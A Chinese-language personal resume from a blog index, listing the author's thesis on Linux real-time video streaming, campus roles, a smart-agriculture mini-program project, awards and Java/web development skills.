毕业论文：基于Linux的实时视频流传输服务 校园经历 2019.09 - 2021.06 社会实践部部长\n处理学院社会实践等相关事宜 带领志愿服务团队开展志愿服务活动 组织团队参加志愿服务大赛并荣获湖南省志愿服务大赛金奖。 2021.06 - 2022.06 校园招聘助理\n负责对接学校承办的各类招聘会，通过与企业的沟通为学生筛选出优质企业 同时向企业推荐一些优秀毕业生，从而提高学校的就业水平和质量，营造良好的就业氛围 2021.09 - 2022.06 可视化智慧农业小程序项目负责人\n带领项目团队参加挑战杯大学生课外学术科技作品竞赛 主要负责微信小程序的后台开发 软件架构：SpringBoot+MyBatis+Maven+Redis+Vue+jdk1.8 利用ffmpeg实现实时视频的推流和拉流 荣誉奖项 国家级：国家励志奖学金\n省级：湖南省志愿服务大赛金奖\n校级：优秀学生干部、优秀青年志愿者、三好学生、“挑战杯”大学生课外学术科技作品竞赛二等奖、\u0026ldquo;互联网+\u0026ldquo;创新创业竞赛二等奖、\u0026ldquo;创青春\u0026quot;大学生创业计划竞赛二等奖、暑假\u0026quot;三下乡\u0026quot;社会实践活动\u0026quot;优秀个人\u0026rdquo;\n专业技能 熟悉Java，熟悉Spring、SpringMVC、SpringBoot、Mybatis-plus等常用开源框架 熟悉MySQL，能够熟练编写sql语句，了解Redis等缓存技术 熟悉JQuery、JavaScript、JSP、ajax、css、xml等web技术 熟悉常见的开发辅助工具Git、maven等 熟悉tomcat，掌握常用的通信协议，了解常用设计模式，数据结构及算法 熟悉Linux环境，基本操作，服务器环境搭建及部署，了解Linux开发和shell编程。 熟悉抓包、爬虫、利用ffmpeg进行音视频开发 ","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AE%80%E5%8E%86/helena-hertz-wWZzXlDpMog-unsplash_hu4699868770670889127.jpg","permalink":"https://chenyuan1125.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AE%80%E5%8E%86/","title":"个人简历"}]